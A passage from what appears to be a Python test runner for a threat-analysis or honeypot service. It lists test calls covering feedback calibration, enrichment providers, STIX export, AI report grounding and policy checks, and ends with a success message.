    test_calibration_worker_counts_feedback_rows_not_scorer_sources()
    test_calibration_worker_hydrates_feedback_from_snapshot_id()
    test_controlled_auto_evidence_is_not_production_calibration_eligible_by_default()
    test_controlled_test_session_prefix_is_not_production_calibration_eligible()
    test_live_auto_evidence_can_be_production_calibration_eligible()
    test_calibration_worker_excludes_controlled_test_rows_from_production_threshold()
    test_operator_feedback_remains_not_weight_eligible_even_with_live_origin()
    test_calibration_worker_ignores_operator_feedback_for_weights()
    test_calibration_worker_uses_high_confidence_auto_evidence_from_later_events()
    test_session_worker_loads_calibration_output_overlay()
    test_classification_evaluation_exports_imports_and_scores_review_labels()
    test_classification_auto_validation_stores_weak_labels_without_manual_json_editing()
    test_classification_auto_validation_accepts_tactic_level_agreement()
    test_monitor_records_and_renders_analyst_feedback()
    test_feedback_review_identifies_high_confidence_wrong_and_low_confidence_useful()
    test_monitor_renders_feedback_review_filters()
    test_monitor_renders_prediction_evidence_status()
    test_no_command_session_is_skipped_without_analysis_job()
    test_analysis_worker_stores_report_with_provenance()
    test_analysis_worker_skips_legacy_no_command_job_without_retry()
    test_analysis_worker_writes_deterministic_fallback_report()
    test_closed_session_report_exposes_threat_hunting_correlation_context()
    test_webhook_dispatcher_noops_without_url()
    test_webhook_dispatcher_honors_max_attempts()
    test_webhook_dispatcher_sends_medium_threat_hunt_matches_only()
    test_feed_stale_cache_fallback_and_kev_rescan()
    test_enrichment_worker_normalizes_and_caches_provider_results()
    test_enrichment_jobs_claim_urgent_priority_first()
    test_reprioritize_enrichment_job_keeps_highest_priority()
    test_censys_platform_token_config_and_normalization()
    test_shodan_provider_falls_back_to_internetdb()
    test_unconfigured_provider_uses_short_retry_ttl()
    test_monitor_extracts_report_recommendations()
    test_monitor_rejects_untrusted_report_recommendation_fallbacks()
    test_ai_operator_actions_are_rejected_before_report_merge()
    test_ai_grounding_drops_unobserved_claims_and_completed_next_action()
    test_ai_grounding_drops_completed_download_or_sensitive_file_claim()
    test_ai_report_ioc_table_uses_external_urls_without_c2_claim()
    test_ai_report_download_hash_recommendation_handles_missing_url()
    test_ai_report_uses_trusted_policy_recommendation_engine()
    test_stix_bundle_exports_policy_actions_observations_sightings_and_campaign()
    test_stix_bundle_rejects_untrusted_ai_recommendations_as_courses_of_action()
    test_stix_bundle_validator_rejects_unsafe_course_of_action()
    test_stix_external_validator_skips_when_optional_dependency_missing()
    test_stix_external_validator_required_fails_when_dependency_missing()
    test_ai_report_deterministic_summary_is_evidence_only()
    test_monitor_report_panel_shows_ai_validation_warnings_and_clear_follow_on_label()
    test_monitor_renders_realtime_prediction_snapshot()
    test_monitor_renders_observable_sightings_and_related_sessions()
    test_monitor_renders_cross_session_threat_hunt_links_and_jobs()
    test_monitor_renders_inline_enrichment_values()
    test_detection_quality_audit_surfaces_review_and_unknown_gaps()
    test_smb_decision_uses_trusted_policy_and_asset_context()
    test_smb_action_policy_requires_trusted_references()
    test_smb_action_policy_requires_reviewed_provenance()
    test_smb_decision_adds_mitre_reference_guidance_without_policy_authority()
    test_report_completed_actions_are_policy_ordered_not_ttp_allowlist()
    test_coverage_audit_reports_mapping_surfaces()
    test_classification_rule_policy_validates_and_loads_command_rules()
    print("production service tests passed")
